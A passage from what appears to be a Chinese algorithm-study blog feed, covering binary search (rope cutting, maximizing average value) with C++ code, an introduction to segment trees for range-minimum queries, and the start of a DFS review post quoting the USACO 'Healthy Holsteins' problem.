ub) /<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(a[mid] &gt;= k)&#123;</span><br><span class="line">ub = mid;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">lb =mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ub);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种算法被称为二分搜索。此外 STL 以 lower_bound 函数的形式也实现了二分搜索。<br>下面还有一道题，刚看到时总感觉手足无措，感觉暴力不行又没有其他办法，这时使用二分能很好地解决问题。</p><blockquote><p>有 N 条绳子，长度分别为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。如果从他们中切割出 K 条长度相同的绳子的话，这 K 条绳子每条最长能有多长？答案保留小数点后 2 位。</p></blockquote><p>让我们试着套用二分搜索的模型解决这个问题：条件 C (x):= 可以得到 K 条长度为 x 的绳子。<br>则问题变成了满足 C (x) 的条件的最大 x。在区间初始化时，只需要充分大的数 INF 作为上界即可: lb =0,ub = INF<br> 现在的问题是是否可以高效判断 C (x)。由于长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的绳子最多可以切除 floor (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> /x) 段长度为 x 的绳子，因此：C (x) = floor (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>/x) 的总和是否大于等于 k。 者可以在 O (n) 的时间内被判断出来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> N,k;</span><br><span class="line"><span class="type">double</span> L[MAX_N];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">C</span><span class="params">(<span class="type">double</span> x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;N; i++)&#123;</span><br><span class="line">num += (<span class="type">int</span>)(L[i] / x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> num&gt;=K;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">double</span> lb =<span class="number">0</span>, ub =INF;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line"><span class="type">double</span> mid = (lb + ub) /<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">C</span>(mid)) lb = mid;</span><br><span class="line"><span class="keyword">else</span> ub = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>,<span class="built_in">floor</span>(ub*<span class="number">100</span>)/<span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="不止查找-二分应用"><a class="markdownIt-Anchor" href="#不止查找-二分应用">#</a> 不止查找 - 二分应用</h4><h5 id="最大化平均值"><a class="markdownIt-Anchor" href="#最大化平均值">#</a> 最大化平均值</h5><blockquote><p>n 个物品的价值分别是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mtext>和</mtext><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i和v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。从中选出 k 个物品使得单位重量的价值最大。</p></blockquote><p>思路挺简单的，最大单位重量价值不超过题目给定最大价值直接利用二分 l=0,r=max_value。check 函数上直接检测能否用当前值进行判断即可。这里给出计算公式<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum\limits_{i=1}^n(v_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.329066em;vertical-align:-0.9776689999999999em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3513970000000004em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9776689999999999em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>/<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><msub><mi>w</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum\limits_{i=1}^n(w_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.329066em;vertical-align:-0.9776689999999999em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3513970000000004em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9776689999999999em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> &gt;= x<br> 可以转变为： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><msub><mi>v</mi><mi>i</mi></msub><mo>−</mo><mi>x</mi><mo>∗</mo><msub><mi>w</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum\limits_{i=1}^n(v_i - x* w_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.329066em;vertical-align:-0.9776689999999999em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3513970000000004em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9776689999999999em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> &gt;= 0 便于写 check 函数。</p><h3 id="线段树"><a class="markdownIt-Anchor" href="#线段树">#</a> 线段树</h3><p>线段树是擅长处理区间的，形如下图的数据结构。线段树是一棵完美二叉树，（所有叶子的深度都相同，每个系欸但要不是叶子要么是有两个儿子的树），树上的每个节点都维护一个子区间。当有 n 个元素时，对区间的操作可以在 O (log n) 的时间内完成。<br><img src="https://raw.githubusercontent.com/dagzi1231/imagestorage/b9730e494d8c042cda559ccf4eace3c9bed4d449/img/20200212110638812.png" alt="线段树演示"><br>根据节点中维护的数据的不同，线段树可以提供不同的功能。下面实现了基于 RMQ 操作的线段树。</p><h4 id="基于线段树的rmq结构"><a class="markdownIt-Anchor" href="#基于线段树的rmq结构">#</a> 基于线段树的 RMQ 结构</h4><p>下面要建立的线段树在给定数列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>, 的情况下，可以在 O (log n) 时间内完成如下两种操作</p><ul><li>给定 s 和 t，求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">a_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>s</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{s+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>,…,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">a_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最小值</li><li>给定 i 和 x，把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, 的值改成 x<br> 如下图，线段树的每个节点维护对应区间的最小值。在建树时，只需要按从下到上的顺序分别取左右儿子的值中较小者就可以了。</li></ul><h4 id="基于线段树的rmq查询"><a class="markdownIt-Anchor" href="#基于线段树的rmq查询">#</a> 基于线段树的 RMQ 查询</h4><p>如果要求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>6</mn></msub></mrow><annotation encoding="application/x-tex">a_6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最小值。我们只需要求出下图中的三个节点的值的最小值即可。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
            <tag> 学习 </tag>
            
            <tag> 最小生成树 </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DFS--复习</title>
      <link href="/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>先上题目：</p><hr><h1 id="usaco21-健康的荷斯坦奶牛-healthy-holsteins"><a class="markdownIt-Anchor" href="#usaco21-健康的荷斯坦奶牛-healthy-holsteins">#</a> [USACO2.1] 健康的荷斯坦奶牛 Healthy Holsteins</h1><h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述">#</a> 题目描述</h2><p>农民 John 以拥有世界上最健康的奶牛为傲。他知道每种饲料中所包含的牛所需的最低的维他命量是多少。请你帮助农夫喂养他的牛，以保持它们的健康，使喂给牛的饲料的种数最少。</p><p>给出牛所需的最低的维他命量，输出喂给牛需要哪些种类的饲料，且所需的饲料剂量最少。</p><p>维他命量以整数表示，每种饲料最多只能对牛使用一次，数据保证存在解。</p><h2 id="输入格式"><a class="markdownIt-Anchor" href="#输入格式">#</a> 输入格式</h2><p>第一行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>，表示需要的维他命的种类数。<br>第二行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 个整数，表示牛每天需要的每种维他命的最小量。</p><p>第三行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span>，表示可用来喂牛的饲料的种数。<br>下面 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span> 行，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 行表示编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 饲料包含的各种维他命的量的多少。</p><h2 id="输出格式"><a class="markdownIt-Anchor" href="#输出格式">#</a> 输出格式</h2><p>输出文件只有一行，包括牛必需的最小的饲料种数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>；后面有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span> 个数，表示所选择的饲料编号（按从小到大排列）。</p><p>如果有多个解，输出饲料序号最小的（即字典序最小）。</p><h2 id="样例-1"><a class="markdownIt-Anchor" href="#样例-1">#</a> 样例 #1</h2><h3 id="样例输入-1"><a class="markdownIt-Anchor" href="#样例输入-1">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">100 200 300 400</span><br><span class="line">3</span><br><span class="line">50  50  50  50</span><br><span class="line">200 300 200 300</span><br><span class="line">900 150 389 399</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a class="markdownIt-Anchor" href="#样例输出-1">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 1 3</span><br></pre></td></tr></table></figure><h2 id="提示"><a class="markdownIt-Anchor" href="#提示">#</a> 提示</h2><p>【数据范围】<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span 